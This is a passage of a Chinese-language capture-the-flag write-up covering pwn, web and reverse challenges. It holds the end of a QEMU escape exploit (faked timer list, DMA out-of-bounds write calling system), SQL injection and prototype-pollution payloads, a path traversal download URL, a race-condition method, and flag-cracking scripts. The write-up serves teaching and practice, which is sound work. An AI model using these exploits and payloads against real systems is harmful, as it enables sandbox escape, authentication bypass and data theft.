  <span class="hljs-keyword">void</span> *fake_timer_list =(<span class="hljs-keyword">void</span> *)(main_loop_tlg_addr + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x100</span>);
  <span class="hljs-keyword">void</span> *fake_timer = (<span class="hljs-keyword">void</span> *)((<span class="hljs-keyword">size_t</span>)fake_timer_list + <span class="hljs-keyword">sizeof</span>(struct QEMUTimerList));

  <span class="hljs-keyword">void</span> *system_plt = code_base + <span class="hljs-number">0x2B3D60</span>;
  <span class="hljs-keyword">void</span> *cmd_addr = fake_timer + <span class="hljs-keyword">sizeof</span>(struct QEMUTimer);

  *(<span class="hljs-keyword">size_t</span> *)(payload + <span class="hljs-number">8</span> + <span class="hljs-number">3</span> * <span class="hljs-number">0x10</span> + <span class="hljs-number">0</span>) = (<span class="hljs-keyword">size_t</span>)fake_timer_list;
  *(<span class="hljs-keyword">char</span> *)(payload + <span class="hljs-number">8</span> + <span class="hljs-number">3</span> * <span class="hljs-number">0x10</span> + <span class="hljs-number">0xc</span>) = <span class="hljs-number">1</span>;

  <span class="hljs-comment">/* Fake Timer List */</span>
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake timer list\n&quot;</span>);
  tl-&gt;clock = (<span class="hljs-keyword">void</span> *)(main_loop_tlg_addr + <span class="hljs-number">0x20</span> + <span class="hljs-number">3</span> * <span class="hljs-number">0x10</span>);
  *(<span class="hljs-keyword">size_t</span> *)&amp;tl-&gt;active_timers_lock[<span class="hljs-number">0x28</span>] = <span class="hljs-number">1</span>;
  tl-&gt;active_timers = fake_timer;
  tl-&gt;le_next = <span class="hljs-number">0x0</span>;
  tl-&gt;le_prev = <span class="hljs-number">0x0</span>;
  tl-&gt;notify_cb = (<span class="hljs-keyword">void</span> *)qemu_timer_notify_cb_addr;
  tl-&gt;notify_opaque = <span class="hljs-number">0x0</span>;
  tl-&gt;timers_done_ev = <span class="hljs-number">0x0000000100000000</span>;

  <span class="hljs-comment">/*Fake Timer structure*/</span>
  ts-&gt;timer_list = fake_timer_list;
  ts-&gt;cb = system_plt;
  ts-&gt;opaque = cmd_addr;
  ts-&gt;scale = <span class="hljs-number">1000000</span>;
  ts-&gt;expire_time = <span class="hljs-number">-1</span>;</code></pre><p>接着就是通过越界写去篡改main_loop_tlg，为了方便减少误差，注意两点。一个是直接使用qemu的plt表内的函数，不要去泄露libc，那样就画蛇添足了；另一个是伪造tlg的时候尽量一次写完，但是要对qemu_clocks进行伪造，可以在实际利用时提高稳定性</p>
<pre class="hljs"><code>  <span class="hljs-constructor">SetDMACMD(1)</span>;
  <span class="hljs-constructor">SetDMADST(<span class="hljs-params">main_loop_tlg_addr</span> - DMA_BUF_ADDR + 0x18)</span>;
  <span class="hljs-constructor">SetDMASRC(<span class="hljs-params">virt2phys</span>(<span class="hljs-params">payload</span>)</span>);
  <span class="hljs-constructor">SetDMACNT(0x200)</span>;
  <span class="hljs-constructor">TriggerDMAWrite()</span>;</code></pre><p>提一下，用musl-gcc可以在静态编译时极大地减小exp大小</p>
<h3 id="secure-prototypelow"><a class="header-link" href="#secure-prototypelow"></a>secure-prototype(low)</h3>
<p>这道题目没有开启PIE，意味着我们可以随意去预测任意地址。
根据分析发现，这道题目除了39321的DEBUG功能外，还有1056这一个功能。</p>
<p class="img-container"><img src="https://i.imgur.com/flsOdhh.png" alt=""></p>
<p>这个功能编辑了off_22050的函数指针</p>
<p class="img-container"><img src="https://i.imgur.com/s0gM4w0.png" alt=""></p>
<p>而这个函数指针在4919功能中被调用。
因此，我们可以通过传入参数更改该函数指针，随后可以达到任意执行函数的效果。
此处改为plt表中的scanf函数</p>
<p class="img-container"><img src="https://i.imgur.com/5FNhswz.png" alt=""></p>
<p>随后即可改写任意内存。
而在功能48中，程序打开了filename字符串所指向的文件，因此我们可以改写filename字符串达到任意读文件的目的。</p>
<p class="img-container"><img src="https://i.imgur.com/goYrVD8.png" alt=""></p>
<p>接下来要解决的是scanf的参数，参数2已经有了（filename字符串所在的地址），参数1可以查找%s字符串位置，在这里：</p>
<p class="img-container"><img src="https://i.imgur.com/IkzTyAg.png" alt=""></p>
<p>大致思路有了，接下来构造exp:
发送 1056 66928 0 0 改写函数指针到scanf函数
发送 4919 70140 139352 0 调用scanf函数，其中两个参数分别为%s和filename的地址
发送 flag.txt 改写filename为flag.txt
发送 48 0 0 0 执行读文件操作，即可读到flag.txt文件</p>
<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
<h3 id="trading-apihigh"><a class="header-link" href="#trading-apihigh"></a>trading-api(High)</h3>
<p>GET token：</p>
<pre class="hljs"><code>{
    <span class="hljs-attr">&quot;username&quot;</span>:<span class="hljs-string">&quot;../../../../health?rdd/.&quot;</span>,
    <span class="hljs-attr">&quot;password&quot;</span>:<span class="hljs-string">&quot;aaaa&quot;</span>
}</code></pre><p>拿到token能访问的接口：<a href="http://flu.xxx:20035/api/transactions/1">http://flu.xxx:20035/api/transactions/1</a>  （但是没数据可以读）
写下思路：</p>
<ol class="list">
<li>if (regex.test(req.url) &amp;&amp; !hasPermission(userPermissions, username, permission)) { 
这里是and ，所以满足regex.test(req.url) = 0也是可以绕过校验，访问api/priv/assets
满足hasPermission需要构造出username为warrenbuffett69的jwt</li>
<li>在api/priv/assets里注入or二次注入</li>
</ol>
<p>路由的c解析库可能有问题，碰到#会把\变成/，但是req.url还是/api\priv/，可以绕过正则</p>
<p class="img-container"><img src="https://i.imgur.com/BTY6cER.png" alt=""></p>
<p class="img-container"><img src="https://i.imgur.com/GDYzVUh.png" alt=""></p>
<p>这里不难看出可以原型链污染，但是要配合最后的注入，把我们的payload注入进去</p>
<p class="img-container"><img src="https://i.imgur.com/RQaYqOF.png" alt=""></p>
<p>这里escapedParams的遍历key可以把我们上一步构造的原型链污染的key获取到</p>
<p class="img-container"><img src="https://i.imgur.com/P2qatc5.png" alt=""></p>
<p>这里的
username  = &quot;../../::txId/../health?/.&quot;的构造，其实是利用replaceall，先把:txId替换成199152684014119，然后利用原型链注入进去的199152684014119这个key，将:199152684014119替换成我们的恶意sql</p>
<p>最后的query就是</p>
<pre class="hljs"><code><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> transactions (id, asset, amount, username) <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">95187879456802</span>, <span class="hljs-string">&#x27;__proto__&#x27;</span>, <span class="hljs-number">-1</span>, <span class="hljs-string">&#x27;../../&#x27;</span><span class="hljs-operator">||</span>(<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag)<span class="hljs-operator">||</span><span class="hljs-string">&#x27;/../health?/.&#x27;</span>)</code></pre><p>最后附上简单的解题过程：</p>
<p class="img-container"><img src="https://i.imgur.com/0xUbtWw.png" alt=""></p>
<p class="img-container"><img src="https://i.imgur.com/DPiFdOy.png" alt=""></p>
<p class="img-container"><img src="https://i.imgur.com/3dynoYq.png" alt=""></p>
<h3 id="diamond-safemid"><a class="header-link" href="#diamond-safemid"></a>Diamond Safe(Mid)</h3>
<p>题目附件下下来</p>
<p>先看login.php中的代码</p>
<pre class="hljs"><code><span class="hljs-variable">$query</span> = db::prepare(<span class="hljs-string">&quot;SELECT * FROM `users` where password=sha1(%s)&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>])){
    <span class="hljs-variable">$query</span> = db::prepare(<span class="hljs-variable">$query</span> . <span class="hljs-string">&quot; and name=%s&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-variable">$query</span> = <span class="hljs-variable">$query</span> . <span class="hljs-string">&quot; and name=&#x27;default&#x27;&quot;</span>;
}
    <span class="hljs-variable">$query</span> = <span class="hljs-variable">$query</span> . <span class="hljs-string">&quot; limit 1&quot;</span>;
    <span class="hljs-variable">$result</span> = db::commit(<span class="hljs-variable">$query</span>);</code></pre><p>其中prepare处的代码[DB.class.php]：</p>
<pre class="hljs"><code><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">prepare</span>(<span class="hljs-params"><span class="hljs-variable">$query</span>, <span class="hljs-variable">$args</span></span>)</span>{
        <span class="hljs-keyword">if</span> (is_null(<span class="hljs-variable">$query</span>)){
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%&#x27;</span>) === <span class="hljs-literal">false</span>){
            <span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;%s not included in query!&#x27;</span>);
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-comment">// get args</span>
        <span class="hljs-variable">$args</span> = func_get_args();
        array_shift( <span class="hljs-variable">$args</span> );
        <span class="hljs-variable">$args_is_array</span> = <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>]) &amp;&amp; count(<span class="hljs-variable">$args</span>) == <span class="hljs-number">1</span> ) {
            <span class="hljs-variable">$args</span> = <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>];
            <span class="hljs-variable">$args_is_array</span> = <span class="hljs-literal">true</span>;
        }
        <span class="hljs-variable">$count_format</span> = substr_count(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%s&#x27;</span>);
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$count_format</span> !== count(<span class="hljs-variable">$args</span>)){
            <span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Wrong number of arguments!&#x27;</span>);
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-comment">// escape</span>
        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$args</span> <span class="hljs-keyword">as</span> &amp;<span class="hljs-variable">$value</span>){
            <span class="hljs-variable">$value</span> = <span class="hljs-built_in">static</span>::<span class="hljs-variable">$db</span>-&gt;real_escape_string(<span class="hljs-variable">$value</span>);
        }
        <span class="hljs-comment">// prepare</span>
        <span class="hljs-variable">$query</span> = str_replace(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-string">&quot;&#x27;%s&#x27;&quot;</span>, <span class="hljs-variable">$query</span>);
        <span class="hljs-variable">$query</span> = vsprintf(<span class="hljs-variable">$query</span>, <span class="hljs-variable">$args</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$query</span>;
    }</code></pre><p>prepare中用到了<code>$query = vsprintf($query, $args)</code>; 
这里的漏洞点是：</p>
<p class="img-container"><img src="https://i.imgur.com/vwFnmal.png" alt=""></p>
<p>我们可以通过一下payload进行闭合：</p>
<pre class="hljs"><code><span class="hljs-attribute">password</span>=password%<span class="hljs-number">1</span>$&amp;name=)+or+<span class="hljs-number">1</span>=<span class="hljs-number">1</span>%<span class="hljs-number">23</span>name</code></pre><p>把name的值通过%1带到password中，绕过过滤，闭合sha1()，然后用or进行永真闭合</p>
<p class="img-container"><img src="https://i.imgur.com/dO7bpzi.png" alt=""></p>
<p>登陆进去之后</p>
<p class="img-container"><img src="https://i.imgur.com/70RvcaN.png" alt=""></p>
<p>可以看到有下文件的点，不过有个校验：check_url和gen_secure_url，大致意思是把要下的文件加上secret的md5值和传入的md5值比较，但是这里获取参数用的是<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>，获取到的是未urldecode的字符串，所以这里可以直接利用QUERY_STRING不自动urldecode的特性和php中空格等于_的特性一把梭</p>
<p>构造链接：</p>
<pre class="hljs"><code><span class="hljs-attribute">https</span>://diamond-safe.flu.xxx/download.php?h=f<span class="hljs-number">2</span>d<span class="hljs-number">03</span>c<span class="hljs-number">27433</span>d<span class="hljs-number">3643</span>ff<span class="hljs-number">5</span>d<span class="hljs-number">20</span>f<span class="hljs-number">1409</span>cb<span class="hljs-number">013</span>&amp;file_name=FlagNotHere.txt&amp;file%<span class="hljs-number">20</span>name=../../../../../flag.txt</code></pre><p>Getflag</p>
<p class="img-container"><img src="https://i.imgur.com/FwzhGUT.png" alt=""></p>
<h3 id="nodenblow"><a class="header-link" href="#nodenblow"></a>NodeNB(low)</h3>
<p>创建用户是分两步：</p>
<pre class="hljs"><code><span class="hljs-keyword">await</span> db.set(<span class="hljs-string">`user:<span class="hljs-subst">${name}</span>`</span>, uid);
<span class="hljs-keyword">await</span> db.hmset(<span class="hljs-string">`uid:<span class="hljs-subst">${uid}</span>`</span>, { name, hash });</code></pre><p>删除用户的时候是：</p>
<pre class="hljs"><code><span class="hljs-keyword">await</span> db.set(<span class="hljs-string">`user:<span class="hljs-subst">${user.name}</span>`</span>, -<span class="hljs-number">1</span>);
<span class="hljs-keyword">await</span> db.del(<span class="hljs-string">`uid:<span class="hljs-subst">${uid}</span>`</span>);</code></pre><p>Del uid的时候 <code>{ name, hash }</code> 应该是被删掉了的，但是此时用户名对应的uid被设为了 -1
结合访问note时候的判断：</p>
<pre class="hljs"><code><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">await</span> db.hexists(<span class="hljs-string">`uid:<span class="hljs-subst">${uid}</span>`</span>, <span class="hljs-string">&#x27;hash&#x27;</span>)) {
            <span class="hljs-comment">// system user has no password</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }</code></pre><p><code>Del session</code>是在<code>del uid之</code>后的，就是说<code>del uid</code>之后， session还有一段有效的时间，这个时候竞争着去请求/note/flag，就该就能进入<code>if (!await db.hexists(uid:${uid}, &#39;hash&#39;))</code>，返回 true 了吧
 条件竞争题</p>
<p>用burp intruder 一直请求 /notes/flag，然后再去删用户</p>
<p class="img-container"><img src="https://i.imgur.com/pn36u8e.png" alt=""></p>
<h3 id="seekingexploitshigh"><a class="header-link" href="#seekingexploitshigh"></a>SeekingExploits(High)</h3>
<p>(当时没出来 赛后做出来了 记录一下)</p>
<p>emarket-api.php有序列化函数，并且插入exploit_proposals表</p>
<p class="img-container"><img src="https://i.imgur.com/KTQJ5cS.png" alt=""></p>
<p>另外一个emarket.php文件从数据库中获取数据，并且反序列化，进入simple_select函数中，而这一步没有对sql做任何的过滤，exploit_proposals表中的内容是可以随便插入的，所以这里思路就是二次注入</p>
<p class="img-container"><img src="https://i.imgur.com/JCaivKa.png" alt=""></p>
<p>emarket.php是在插件目录下，所以找一个地方可以hook去插件的地方，执行这块儿代码</p>
<p class="img-container"><img src="https://i.imgur.com/WDTv7lv.png" alt=""></p>
<p>这里可以可以hook进去执行emarket.php的list_proposals方法，然后反序列化。这里要执行到run_hooks的前提是要先发过邮件</p>
<p class="img-container"><img src="https://i.imgur.com/qvTV8fw.png" alt=""></p>
<p class="img-container"><img src="https://i.imgur.com/TJz2L4R.png" alt=""></p>
<p>这里如果pmid从数据库中找不到就会报错。</p>
<p>但是这里因为有my_serialize/unserialize方法，不能对object进行操作，所以这里的trick就是利用在
escape_string中的validate_utf8_string方法，可以把%c0%c2变成?，这样就逃逸出来了</p>
<p>Poc:</p>
<pre class="hljs"><code>/emarket-api.php?action=make_proposal&amp;description=<span class="hljs-number">1</span>&amp;software=<span class="hljs-number">1.2</span>&amp;latest_version=<span class="hljs-number">4</span>&amp;additional_info[a]=%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2%c0%c2&amp;additional_info[b]=%<span class="hljs-number">22</span>%3b%<span class="hljs-number">73</span>%3a%<span class="hljs-number">37</span>%3a%<span class="hljs-number">22</span>%<span class="hljs-number">73</span>%6f%6c%<span class="hljs-number">64</span>%5f%<span class="hljs-number">74</span>%6f%<span class="hljs-number">22</span>%3b%<span class="hljs-number">73</span>%3a%<span class="hljs-number">35</span>%<span class="hljs-number">35</span>%3a%<span class="hljs-number">22</span>%<span class="hljs-number">30</span>%<span class="hljs-number">20</span>%<span class="hljs-number">75</span>%6e%<span class="hljs-number">69</span>%6f%6e%<span class="hljs-number">20</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%6c%<span class="hljs-number">65</span>%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">72</span>%6f%<span class="hljs-number">75</span>%<span class="hljs-number">70</span>%5f%<span class="hljs-number">63</span>%6f%6e%<span class="hljs-number">63</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">75</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%6e%6f%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%6f%6d%<span class="hljs-number">20</span>%6d%<span class="hljs-number">79</span>%<span class="hljs-number">62</span>%<span class="hljs-number">62</span>%5f%<span class="hljs-number">75</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">73</span></code></pre><p class="img-container"><img src="https://i.imgur.com/rKRQmsR.png" alt=""></p>
<p class="img-container"><img src="https://i.imgur.com/Axy7q3y.png" alt=""></p>
<p class="img-container"><img src="https://i.imgur.com/UY8eGmy.png" alt=""></p>
<p>打完poc后，直接点击查看就行了</p>
<p class="img-container"><img src="https://i.imgur.com/F3CgiOJ.png" alt=""></p>
<p class="img-container"><img src="https://i.imgur.com/oTe5fJt.png" alt=""></p>
<h2 id="reverse"><a class="header-link" href="#reverse"></a>Reverse</h2>
<h3 id="atareeelow"><a class="header-link" href="#atareeelow"></a>atareee(low)</h3>
<p class="img-container"><img src="https://i.imgur.com/se63odf.png" alt=""></p>
<p>导入Ghidra分析
经过调试可得到，0x50C2地址为我们的输入数据，在xorenc函数中进行加密操作，逻辑如下</p>
<p class="img-container"><img src="https://i.imgur.com/x8uVt6e.png" alt=""></p>
<p>接下来是验证函数，0x509A为输出到屏幕的部分，图中标注的0x5276和0x524e分别为错误、正确字符串的位置</p>
<p class="img-container"><img src="https://i.imgur.com/OupPPJG.png" alt=""></p>
<p>接下来使用Python复现逻辑并进行爆破</p>
<pre class="hljs"><code>target = [
    <span class="hljs-number">0x14</span>,  <span class="hljs-number">0x1E</span>,   <span class="hljs-number">0xC</span>,  <span class="hljs-number">0xE0</span>,
    <span class="hljs-number">0x30</span>,  <span class="hljs-number">0x5C</span>,  <span class="hljs-number">0xCE</span>,  <span class="hljs-number">0xF0</span>,
    <span class="hljs-number">0x36</span>,  <span class="hljs-number">0xAE</span>,  <span class="hljs-number">0xFC</span>,  <span class="hljs-number">0x39</span>,
    <span class="hljs-number">0x1A</span>,  <span class="hljs-number">0x91</span>,  <span class="hljs-number">0xCE</span>,  <span class="hljs-number">0xB4</span>,
    <span class="hljs-number">0xC4</span>,   <span class="hljs-number">0xE</span>,  <span class="hljs-number">0x18</span>,  <span class="hljs-number">0xF3</span>,
    <span class="hljs-number">0xC8</span>,  <span class="hljs-number">0x8E</span>,   <span class="hljs-number">0xA</span>,  <span class="hljs-number">0x85</span>,
    <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xbd</span>
]

array_50c2 = [
    <span class="hljs-number">0xD9</span>,  <span class="hljs-number">0x50</span>,  <span class="hljs-number">0x48</span>,  <span class="hljs-number">0xB9</span>,
    <span class="hljs-number">0xD8</span>,  <span class="hljs-number">0x50</span>,  <span class="hljs-number">0x48</span>,  <span class="hljs-number">0x60</span>,
    <span class="hljs-number">0x46</span>,  <span class="hljs-number">0x54</span>,  <span class="hljs-number">0x43</span>,  <span class="hljs-number">0x44</span>,
    <span class="hljs-number">0x45</span>,  <span class="hljs-number">0x49</span>,  <span class="hljs-number">0x50</span>,  <span class="hljs-number">0x55</span>,
    <span class="hljs-number">0x52</span>,  <span class="hljs-number">0x53</span>,  <span class="hljs-number">0x4C</span>,  <span class="hljs-number">0x47</span>,
    <span class="hljs-number">0x58</span>,  <span class="hljs-number">0x51</span>,  <span class="hljs-number">0xF3</span>,  <span class="hljs-number">0x50</span>,
    <span class="hljs-number">0x8</span>,  <span class="hljs-number">0x51</span>, <span class="hljs-number">0x10</span>
]


array_5219 = [
    <span class="hljs-number">0xBD</span>,  <span class="hljs-number">0x43</span>,  <span class="hljs-number">0x11</span>,  <span class="hljs-number">0x37</span>,
    <span class="hljs-number">0xF2</span>,  <span class="hljs-number">0x69</span>,  <span class="hljs-number">0xAB</span>,  <span class="hljs-number">0x2C</span>,
    <span class="hljs-number">0x99</span>,  <span class="hljs-number">0x13</span>,  <span class="hljs-number">0x12</span>,  <span class="hljs-number">0xD1</span>,
    <span class="hljs-number">0x7E</span>,  <span class="hljs-number">0x9A</span>,  <span class="hljs-number">0x8F</span>,   <span class="hljs-number">0xE</span>,
    <span class="hljs-number">0x92</span>,  <span class="hljs-number">0x37</span>,  <span class="hljs-number">0xF4</span>,  <span class="hljs-number">0xAA</span>,
    <span class="hljs-number">0x4D</span>,  <span class="hljs-number">0x77</span>,   <span class="hljs-number">0x3</span>,  <span class="hljs-number">0x89</span>,
    <span class="hljs-number">0xCA</span>,  <span class="hljs-number">0xFF</span>,
]

array_5234 = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x1a</span>)]

in_C = <span class="hljs-number">0</span>

j = <span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x19</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):
    in_C = <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> (<span class="hljs-number">0x19</span> &lt; i + <span class="hljs-number">1</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>, <span class="hljs-number">0x60</span>):
        array_50c2[i] = j
        var1 = i
        
        var2 = <span class="hljs-number">0</span>
        <span class="hljs-keyword">if</span> var1 &amp; <span class="hljs-number">1</span> == <span class="hljs-number">0</span>:
            array_5234[i] = array_50c2[i] ^ array_50c2[i + <span class="hljs-number">1</span>]
            var2 = i
            var1 = array_5234[i]
            array_5234[i] = ((var1 &lt;&lt; <span class="hljs-number">1</span>) | ((array_50c2[i] + i) &gt;&gt; <span class="hljs-number">7</span>)) &amp; <span class="hljs-number">0xff</span>
        <span class="hljs-keyword">else</span>:
            array_5234[i] = array_50c2[i] ^ array_5219[i]
            var1 = array_5234[i]
            array_5234[i] = ((var1 &lt;&lt; <span class="hljs-number">1</span>) | in_C) &amp; <span class="hljs-number">0xff</span>
        <span class="hljs-keyword">if</span> var1 &gt;&gt; <span class="hljs-number">7</span> != <span class="hljs-number">0</span>:
            array_5234[i] = array_5234[i] + <span class="hljs-number">1</span>

        <span class="hljs-keyword">if</span> array_5234[i] == target[i]:
            <span class="hljs-built_in">print</span> (<span class="hljs-built_in">chr</span>(j), end= <span class="hljs-string">&#x27;&#x27;</span>)
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;no&quot;</span>)
<span class="hljs-comment">#KNOTS_ORT3R_M3D_T3G_GALP</span></code></pre><p class="img-container"><img src="https://i.imgur.com/d9DYwnI.png" alt=""></p>
<p>由于脚本为倒序输出，需要将得到字符串进行倒序处理，即FLAG_G3T_D3M_R3TR0_ST0NK
但是最后两个字符无法通过爆破得到，但题目的成功字符串给出了提示</p>
<p class="img-container"><img src="https://i.imgur.com/ugkdasu.png" alt=""></p>
<p class="img-container"><img src="https://i.imgur.com/qgWzLSs.png" alt=""></p>
<p>经过验证得出完整flag: FLAG_G3T_D3M_R3TR0_ST0NKZ!</p>
<h3 id="ollvm-high"><a class="header-link" href="#ollvm-high"></a>OLLVM (High)</h3>
<p>通过逆向可以得知原控制流逻辑为</p>
<pre class="hljs"><code>原始输入数据 <span class="hljs-number">989898121212</span>
firstfn      <span class="hljs-number">2</span>      sbuf[<span class="hljs-number">2</span>] = <span class="hljs-keyword">not</span>(-<span class="hljs-number">0x4DDB14EE5C8771C5</span>-v)+<span class="hljs-number">1</span> = <span class="hljs-number">0x4DDBAD86F49983D7</span>
sub_46B1F0   <span class="hljs-number">0x1A</span>   sbuf[<span class="hljs-number">4</span>] = <span class="hljs-number">0xB31C9545AC410D72</span>
sub_40FA60   <span class="hljs-number">0x32</span>   sbuf[<span class="hljs-number">5</span>] = (sbuf[<span class="hljs-number">2</span>] ^ <span class="hljs-number">0xB31C9545AC410D72</span>) + <span class="hljs-number">0x8BC715D20D923835</span> = <span class="hljs-number">0x8A8E4E95666AC6DA</span>
sub_46B1F0   <span class="hljs-number">0x4A</span>   sbuf[<span class="hljs-number">6</span>] = <span class="hljs-number">0xCE9A20C53746A9F7</span>
sub_42C730   <span class="hljs-number">0x62</span>   sbuf[<span class="hljs-number">7</span>] = (sbuf[<span class="hljs-number">5</span>] ^ sbuf[<span class="hljs-number">6</span>]) &lt;&lt; <span class="hljs-number">32</span>
sub_425760   <span class="hljs-number">0x7A</span>   sbuf[<span class="hljs-number">8</span>] = (sbuf[<span class="hljs-number">5</span>] ^ sbuf[<span class="hljs-number">6</span>]) &gt;&gt; <span class="hljs-number">32</span>
sub_43CDF0   <span class="hljs-number">0x92</span>   sbuf[<span class="hljs-number">9</span>] = (sbuf[<span class="hljs-number">7</span>] | sbuf[<span class="hljs-number">8</span>]) = <span class="hljs-number">0x512C6F2D44146E50</span> ?
sub_46B1F0   <span class="hljs-number">0xAA</span>   sbuf[<span class="hljs-number">10</span>] = <span class="hljs-number">0xA648BD40DACE4EF5</span>
sub_439C40   <span class="hljs-number">0xC2</span>   sbuf[<span class="hljs-number">11</span>] = sbuf[<span class="hljs-number">9</span>] * <span class="hljs-number">0xA648BD40DACE4EF5</span> = <span class="hljs-number">0x3CD903714589F290</span> = <span class="hljs-number">0x512C6F2D44146E50</span> * <span class="hljs-number">0xA648BD40DACE4EF5</span>
sub_43F240   <span class="hljs-number">0xDA</span>   sbuf[<span class="hljs-number">12</span>] = sbuf[<span class="hljs-number">11</span>] + <span class="hljs-number">0x18B205A73CB902B7</span> = <span class="hljs-number">0x558B09188242F547</span>
sub_46B1F0   <span class="hljs-number">0xF2</span>   sbuf[<span class="hljs-number">13</span>] = <span class="hljs-number">0x0000000000000008</span>
sub_461DA0   <span class="hljs-number">0x10A</span>  sbuf[<span class="hljs-number">14</span>] = (sbuf[<span class="hljs-number">11</span>] + <span class="hljs-number">0x18B205A73CB902B7</span>) &gt;&gt; <span class="hljs-number">8</span> = <span class="hljs-number">0x00558B09188242F5</span>
sub_4195F0   <span class="hljs-number">0x122</span>  sbuf[<span class="hljs-number">15</span>] = (sbuf[<span class="hljs-number">12</span>] &lt;&lt; <span class="hljs-number">56</span>) | sbuf[<span class="hljs-number">14</span>] = <span class="hljs-number">0x47558B09188242F5</span>
sub_46B1F0   <span class="hljs-number">0x13A</span>  sbuf[<span class="hljs-number">16</span>] = <span class="hljs-number">0x29D5CA44D143B4FC</span>
sub_447AC0   <span class="hljs-number">0x152</span>  sbuf[<span class="hljs-number">17</span>] = (sbuf[<span class="hljs-number">15</span>]^<span class="hljs-number">0x326DEB9C5D995AEB</span>)+<span class="hljs-number">0x29D5CA44D143B4FC</span>=<span class="hljs-number">0x9F0E2ADA165ECD1A</span>
sub_463ED0   <span class="hljs-number">0x16A</span>  sbuf[<span class="hljs-number">18</span>] = (sbuf[<span class="hljs-number">17</span>] &gt;&gt; <span class="hljs-number">8</span>) = <span class="hljs-number">0x009F0E2ADA165ECD</span>
sub_42A9F0   <span class="hljs-number">0x182</span>  sbuf[<span class="hljs-number">19</span>] = (sbuf[<span class="hljs-number">17</span>] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x00FF00FF00FF00FF</span>
sub_46B1F0   <span class="hljs-number">0x19A</span>  sbuf[<span class="hljs-number">20</span>] = <span class="hljs-number">0x0000000000000008</span>
sub_435E50   <span class="hljs-number">0x1B2</span>  sbuf[<span class="hljs-number">21</span>] = (sbuf[<span class="hljs-number">17</span>] &lt;&lt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF00FF00FF00FF00</span>
sub_41EC00   <span class="hljs-number">0x1CA</span>  sbuf[<span class="hljs-number">22</span>] = example <span class="hljs-number">0x9F0E2ADA165ECD1A</span> -&gt; <span class="hljs-number">0x0E9FDA2A5E161ACD</span>
sub_46B1F0   <span class="hljs-number">0x1E2</span>  sbuf[<span class="hljs-number">23</span>] = <span class="hljs-number">0xB9B8A788569D772D</span>
endfunction  <span class="hljs-number">0x1FA</span>  sbuf[<span class="hljs-number">24</span>] = -((sbuf[<span class="hljs-number">22</span>] ^ <span class="hljs-number">0xB9B8A788569D772D</span>) * <span class="hljs-number">0x51F6D71704B266F5</span>)+<span class="hljs-number">1</span> = C54C16BC5F0898A0</code></pre><p>求出逆运算,即可解密flag</p>
<p>乘法需要爆破,可以先爆破低32位,再爆破高32位,代码里我用多线程8核来爆破的</p>
<p>解密flag代码:</p>
<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;windows.h&quot;</span></span>

